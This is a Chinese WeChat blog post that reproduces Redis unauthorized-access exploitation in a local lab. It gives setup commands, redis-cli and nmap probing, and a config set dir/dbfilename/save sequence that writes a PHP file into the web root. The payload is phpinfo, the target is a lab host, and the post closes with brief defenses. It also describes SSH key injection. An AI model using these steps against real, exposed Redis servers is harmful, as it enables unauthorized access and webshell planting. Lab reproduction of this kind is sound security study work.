> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/14cKp5hFQmLhvxcqlnn47w)

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTEJKMzQegLrSia2bM07eGuyd6bAsPV1Z3MEBs8WVGAHT30Zz930kCBc1s33ya7BZnNAcNlK1Frbr9g/640?wx_fmt=png)

#### 0x0**1 漏洞描述**

  Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的 config 命令，可以进行写文件操作，攻击者可以成功将自己的 ssh 公钥写入目标服务器的 /root/.ssh 文件夹的 authotrized_keys 文件中，进而可以使用对应私钥直接使用 ssh 服务登录目标服务器、添加计划任务、写入 Webshell 等操作。

#### 0x02 **漏洞环境搭建**

**环境准备：**

目标靶机: kali

ip 地址: 192.168.43.151  
连接工具:Putty、Redis-cli 客户端连接工具  

**公众号回复 "****Redis****" 即可获取相应工具**  

**环境搭建**:

```
wget http://download.redis.io/releases/redis-2.8.17.tar.gz
tar xzvf redis-2.8.17.tar.gz #解压安装包
cd redis-2.8.17 # 进入redis目录
make #编译
```

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTEJKMzQegLrSia2bM07eGuyd3LXGrZQGHYaP0jzTCjiaoMLzeRjfDCqiaMavquud5kpNic0nicneSHP6vA/640?wx_fmt=png)

```
cd src/ #进入src目录
cp redis-server /usr/bin/
cp redis-cli /usr/bin/ #将redis-server和redis-cli拷贝到/usr/bin目录下（这样启动redis-server和redis-cli就不用每次都进入安装目录了）
cd .. # 返回上一级目录
cp redis.conf /etc/ #将redis.conf拷贝到/etc/目录下
redis-server /etc/redis.conf # 使用/etc/目录下的redis.conf文件中的配置启动redis服务
```

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTEJKMzQegLrSia2bM07eGuydrueadlHLnbtWn7mlym7vPmeW8ibzAV63d821hdX06ULvwJvibjFFLEZg/640?wx_fmt=png)

0x03 漏洞利用  

利用：**C:\Users\yinxinghua\Desktop\ 小白的成长之路 \tools\redis 未授权访问 \redis-2.4.5-win32-win64\64bit>****.\redis-cli.exe -h 192.168.43.151**  

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTEJKMzQegLrSia2bM07eGuydv7hVAnf6tanwJoH5KB7WhSpmJykObXVvmQCx0yJ9T2r45XxWmojXog/640?wx_fmt=png)

nmap 扫描：

```
Nmap -A -p 6379 –script redis-info 192.168.43.151
```

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTEJKMzQegLrSia2bM07eGuydoHMmlxDf1EkJCdUrcibsfkP1Oic8UC2tsWuCtKpe3B3iafa1KvdNQr0Ig/640?wx_fmt=png)  

为了方便，在 windows 攻击机里下载一个 redis clinet  

```
下载地址：https://github.com/caoxinyu/RedisClient/releases （利用redis写webshell测试使用）
```

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTEJKMzQegLrSia2bM07eGuydypLwVSyFK7ia8EVtibOeiaYmrg6WRzG4KbE1kWSrKRpaibqoFNADTDoJug/640?wx_fmt=png)  

未授权访问测试

使用 redis clinet 直接无账号成功登录 redis

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTEJKMzQegLrSia2bM07eGuydxhTp4ciaah3gr0JlLCp4y4p7Ge6uAAmicNqqGdjXYxJPAU4ibHGNemnzw/640?wx_fmt=png)

从登录结果可以看出 redis 未启用认证。

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTEJKMzQegLrSia2bM07eGuydfs4nqf7pcSTSUVeteuEzwdxgSDeuMTebMqjKfKlHU3DibgoCFiaCzyXA/640?wx_fmt=png)  

**利用 redis 写 webshell**

**利用前提**：

靶机 redis 未授权，在攻击机能用 redis clinet 连接，如上图，并未登录验证  
靶机开启 web 服务，并且知道网站路径，还需要具有文件读写增删改查权限

这里我们调出 Console

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTEJKMzQegLrSia2bM07eGuydgQAV8iarFeXMiblWKq1MpmMh08vnRKew4jFryW10ibpXX4czcOpLy0PeQ/640?wx_fmt=png)

**由于本地搭建，我们已经知道网站路径（在实战中需要寻找网站绝对路径），我们把 shell 写入 /var/www/html/ 目录下：**  

```
config set dir /var/www/html
```

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTEJKMzQegLrSia2bM07eGuydBtm9ylE7GpAfsbXUGq4LGk36f5icJjr63NTuibCLDibTUlKgqGrBREGBQ/640?wx_fmt=png)

```
config set dbfilename test.php
```

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTEJKMzQegLrSia2bM07eGuydWpibflofpFQaHtOs3RREuJ5lEQdEEghbOVkmLB9TPVVj9ntT1QViajYg/640?wx_fmt=png)

```
config set webshell "<?php phpinfo(); ?>"
```

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTEJKMzQegLrSia2bM07eGuydn1icwOIbVWIQzsSqlf0ZCppnAOmCmLmTfFy85cIiakxAxYxBWnJwROJA/640?wx_fmt=png)

**save**  

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTEJKMzQegLrSia2bM07eGuyd6fYMu1tKxWGWYBcv9PdicuU51z5IwXOFBiceribgqzTK9vbibic7Vzk6RkA/640?wx_fmt=png)

访问 test.php 成功如下所示！（此图来源于网络，自己环境出现了不可描述事情![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTEJKMzQegLrSia2bM07eGuydMRQiaHTriaceOsJNMYjtcKBTDhAxlsrME5rIQqt0GWWoVcjB91qG51xQ/640?wx_fmt=png)）

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTEJKMzQegLrSia2bM07eGuydu4QGkDsQ144LZfZHbA07b3r03Z20I4zPCLRkjD5wenN75uup75Y8mQ/640?wx_fmt=png)

#### 0x04 **防御手段**

```
-禁止使用root权限启动redis服务。
-对redis访问启动密码认证。
-添加IP访问限制，并更改默认6379端口。
```

**【往期推荐】**  

[未授权访问漏洞汇总](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247484804&idx=2&sn=519ae0a642c285df646907eedf7b2b3a&chksm=ea37fadedd4073c87f3bfa844d08479b2d9657c3102e169fb8f13eecba1626db9de67dd36d27&scene=21#wechat_redirect)  

[干货 | 常用渗透漏洞 poc、exp 收集整理](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485181&idx=3&sn=9eb034dd011ac71c4e3732129c332bb3&chksm=ea37f9a7dd4070b1545a9cb71ba14c8ced10aa30a0b43fb5052aed40da9ca43ac90e9c37f55a&scene=21#wechat_redirect)
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

[记一次 HW 实战笔记 | 艰难的提权爬坑](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247484991&idx=2&sn=5368b636aed77ce455a1e095c63651e4&chksm=ea37f965dd407073edbf27256c022645fe2c0bf8b57b38a6000e5aeb75733e10815a4028eb03&scene=21#wechat_redirect)  

[【超详细】Fastjson1.2.24 反序列化漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247484991&idx=1&sn=1178e571dcb60adb67f00e3837da69a3&chksm=ea37f965dd4070732b9bbfa2fe51a5fe9030e116983a84cd10657aec7a310b01090512439079&scene=21#wechat_redirect)

[【超详细】CVE-2020-14882 | Weblogic 未授权命令执行漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485550&idx=1&sn=921b100fd0a7cc183e92a5d3dd07185e&chksm=ea37f734dd407e22cfee57538d53a2d3f2ebb00014c8027d0b7b80591bcf30bc5647bfaf42f8&scene=21#wechat_redirect)  

[【奇淫巧技】如何成为一个合格的 “FOFA” 工程师](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485135&idx=1&sn=f872054b31429e244a6e56385698404a&chksm=ea37f995dd40708367700fc53cca4ce8cb490bc1fe23dd1f167d86c0d2014a0c03005af99b89&scene=21#wechat_redirect)
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

_**走过路过的大佬们留个关注再走呗**_![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTEATexewVNVf8bbPg7wC3a3KR1oG1rokLzsfV9vUiaQK2nGDIbALKibe5yauhc4oxnzPXRp9cFsAg4Q/640?wx_fmt=png)

**往期文章有彩蛋哦****![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTHtVfEjbedItbDdJTEQ3F7vY8yuszc8WLjN9RmkgOG0Jp7QAfTxBMWU8Xe4Rlu2M7WjY0xea012OQ/640?wx_fmt=png)**

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTECbvcv6VpkwD7BV8iaiaWcXbahhsa7k8bo1PKkLXXGlsyC6CbAmE3hhSBW5dG65xYuMmR7PQWoLSFA/640?wx_fmt=png)  

![](https://mmbiz.qpic.cn/mmbiz_gif/XOPdGZ2MYOeicscsCKx326NxiaGHusgPNRnK4cg8icPXAOUEccicNrVeu28btPBkFY7VwQzohkcqunVO9dXW5bh4uQ/640?wx_fmt=gif)  如果对你有所帮助，点个分享、赞、在看呗！